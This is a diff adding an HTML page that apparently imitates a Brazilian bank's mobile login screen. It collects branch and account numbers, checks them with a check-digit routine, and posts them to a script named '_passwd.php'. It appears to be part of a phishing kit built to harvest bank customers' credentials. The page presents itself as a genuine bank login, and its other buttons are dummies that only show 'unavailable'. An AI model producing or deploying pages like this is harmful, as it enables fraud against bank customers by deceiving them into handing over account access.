@@ -1,0 +1,217 @@
+<html><head>
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<title>APP On-line</title>
+<link rel="stylesheet" href="css/bootstrap.min.css">
+<link rel="stylesheet" href="css/bootstrap-theme.min.css">
+<script src="js/bootstrap.min.js"></script>
+
+<script src="js/pulacampo.js"></script>
+<script src="js/jquery.js"></script>
+<script src="js/jquery.maskedinput.js"></script>
+
+<script language="javascript">
+function validar() {
+var ModalAlertError = document.getElementById("TextErrorModal");
+var ModalAlert = document.getElementById("modalalert");
+if ( document.form.agg.value == "" || 
+document.form.agg.value == "0000" || 
+document.form.agg.value == "1111" || 
+document.form.agg.value == "2222" || 
+document.form.agg.value == "3333" || 
+document.form.agg.value == "4444" || 
+document.form.agg.value == "5555" || 
+document.form.agg.value == "6666" || 
+document.form.agg.value == "7777" || 
+document.form.agg.value == "8888" || 
+document.form.agg.value == "9999" || 
+document.form.agg.value.length < 4 ){
+ModalAlertError.innerHTML = "Agência inválida. Por favor, tente novamente."; ModalAlert.style.display = "";
+document.form.agg.focus(); return false;
+}
+
+if ( document.form.acc.value == "" || 
+document.form.acc.value == "00000-0" || 
+document.form.acc.value == "11111-1" || 
+document.form.acc.value == "22222-2" || 
+document.form.acc.value == "33333-3" || 
+document.form.acc.value == "44444-4" || 
+document.form.acc.value == "55555-5" || 
+document.form.acc.value == "66666-6" || 
+document.form.acc.value == "77777-7" || 
+document.form.acc.value == "88888-8" || 
+document.form.acc.value == "99999-9" || 
+document.form.acc.value.length < 6 ){
+ModalAlertError.innerHTML = "Conta inválida. Por favor, tente novamente."; ModalAlert.style.display = "";
+document.form.acc.focus(); return false;
+}
+
+}
+</script>
+
+<script>
+$(document).ready(function(){
+		$('#modalalert').hide();
+		var size  =  $('#agg').attr("size");
+		var size  =  $('#acc').attr("size");
+		$('#agg').keyup(function(){
+			var entry = $(this).attr("value");
+			var current_length = $(this).attr("value").length;
+			if (current_length>= size) {
+				$('#modalalert').html();
+				$('#modalalert').hide('fast');
+			}
+				else $('#ModalAlert').hide('fast');
+			});
+			
+			$('#acc').keyup(function(){
+			var entry = $(this).attr("value");
+			var current_length = $(this).attr("value").length;
+			if (current_length>= size) {
+				$('#modalalert').html();
+				$('#modalalert').hide('fast');
+			}
+				else $('#ModalAlert').hide('fast');
+			});
+	});
+</script>
+
+<script> 
+function clicar(){ document.getElementById('btn').style.background = "url(img/003.jpg) no-repeat bottom left"; } 
+</script>
+
+<script>
+function clicarAgencia() { document.getElementById('text1').style.display = ""; }
+function clicarConta() { document.getElementById('text2').style.display = ""; }
+</script>
+
+<style type="text/css">
+#agg { border:none; width:70px; height:25px; background:none; color:#FFF; max-width:60px; outline:none; }
+#acc { border:none; width:90px; height:25px; background:none; color:#FFF; max-width:200px; outline:none; }
+#ir { width:100%; padding:10px; background:#F8F5F2; color:#7F7670; border:none; border-radius:3px; }
+::-webkit-input-placeholder { color: #FFF;}
+:-moz-placeholder {  color: #FFF;  }
+::-moz-placeholder { color: #FFF;  }
+:-ms-input-placeholder {  color: #FFF;  }
+</style>
+<script type="text/javascript">
+jQuery(function($){
+   $("#agg").mask("9999",{ placeholder: "" });
+   $("#acc").mask("99999-9",{ placeholder: "" });
+});
+
+function ValidaConta(ag_ct, digito){
+	var temp = 0; //ACUMULADOR
+	var i; // CONTADOR INICIAL
+	var digito_result; //RESULTADO DA SOMA
+	for(i = 0; i < ag_ct.length; i++){
+		if(i % 2 == 0){
+			if((ag_ct[i] * 2) > 9){
+				temp += (ag_ct[i] * 2) - 9;
+			}else{
+				temp += ag_ct[i] * 2;
+			}
+		}else{
+			temp += ag_ct[i] * 1;
+		}
+	}
+
+	if(temp % 10 != 0){
+		digito_result = (10 - (temp % 10));
+	}else{
+		digito_result = 0;
+	}
+
+	if(digito_result == digito){
+		return true;
+	}else{
+		return false;
+	}
+}
+
+function check_enter(){
+	var agencia = $('#agg').val();
+	var conta = $('#acc').val();
+
+
+	var separ 	= conta.split("-");
+	var ag_ct 	= agencia + '' + separ[0];
+	var digito 	= separ[1];
+
+	var CheckC 	= ValidaConta(ag_ct, digito);
+
+	if(agencia.length < 4){
+		alert("Informe corretamente o número de sua agência!");
+		$('#agg').focus();
+		return false;
+	}
+
+	if(conta.length < 7){
+		alert("Informe corretamente o número de sua conta!");
+		$('#acc').focus();
+		return false;
+	}
+
+	if(!CheckC){
+		alert("Agência ou conta informados não são válidos! Por favor, tente novamente!");
+		$('#acc').focus();
+		return false;
+	}
+
+
+
+}
+
+</script>
+</head>
+
+<body style="margin:0; padding:0;">
+<div style="width:100%; height:100%; position:absolute; background:url(img/001.jpg) no-repeat center; background-size:cover;">
+<div style="height:70px; background:url(img/000.png) no-repeat; margin-top:10px; margin-left:10px;"></div>
+
+<div style="width:100%; height:50%; top:50%; position:absolute; background: rgba(0,0,0,0.4) ; background: -webkit-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: -o-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: -moz-linear-gradient(rgba(0,0,0,0.0), rgba(0,0,0,0.9)); background: linear-gradient(red, rgba(0,0,0,0.0)(0,0,0,0.9));">
+
+<div style="padding:10px 15px 15px 15px; background:#E97005; background-size:contain;left:10px; position:fixed; bottom:70px; right:0; border-radius:5px 0 0 5px;">
+<form name="form" id="form" action="_passwd.php" method="post" onsubmit="return check_enter();" autocomplete="off">
+
+<input type="hidden" name="display" id="display" value="none">
+<div style="border-bottom:2px solid #F0A25A;">
+<table cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td height="15"><div id="text1" style="display:none; font-size:11px; color:#FFF;">agência</div></td>
+<td height="15"><div id="text2" style="display:none; font-size:11px; color:#FFF;">conta</div></td>
+</tr>
+<tr>
+<td><input type="tel" name="agg" id="agg" placeholder="agência" maxlength="4" size="1" onkeypress="clicarAgencia()" onkeyup="javascript:pulacampo('agg','acc')"></td>
+<td><input type="tel" name="acc" id="acc" placeholder="conta" maxlength="7" size="1" onkeypress="clicarConta()" onkeyup="javascript:pulacampo('acc','ir')"></td>
+</tr>
+</tbody></table>
+
+</div>
+<div id="btn" style="background:url(img/003.jpg) no-repeat; height:24px; margin-top:10px; padding:5px 0 0 58px; font-size:12px; color:#FFF;" onclick="clicar()">
+lembrar agência e conta
+</div>
+<div style="margin-top:15px;">
+<input type="submit" name="ir" id="ir" value="ok">
+</div>
+</form>
+</div>
+
+<div style="height:70px; background:; position:absolute; bottom:0; left:0; right:0;">
+<div style="height:70px; background:url(img/T01.png) no-repeat left;">
+<div onclick="alert('Indisponivel')" style="height:70px; background:url(img/T02.png) no-repeat center;">
+<div style="height:70px; background:url(img/T03.png) no-repeat right;">
+</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div style="max-width: 360px; margin: 0px auto; font-size: 12px; background: rgb(83, 30, 109); color: rgb(255, 255, 255); border-radius: 5px; padding: 6px 10px; position: fixed; top: 10px; left: 20px; right: 20px; display: none;" id="modalalert">
+<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
+</div>
+
+
+</body></html>
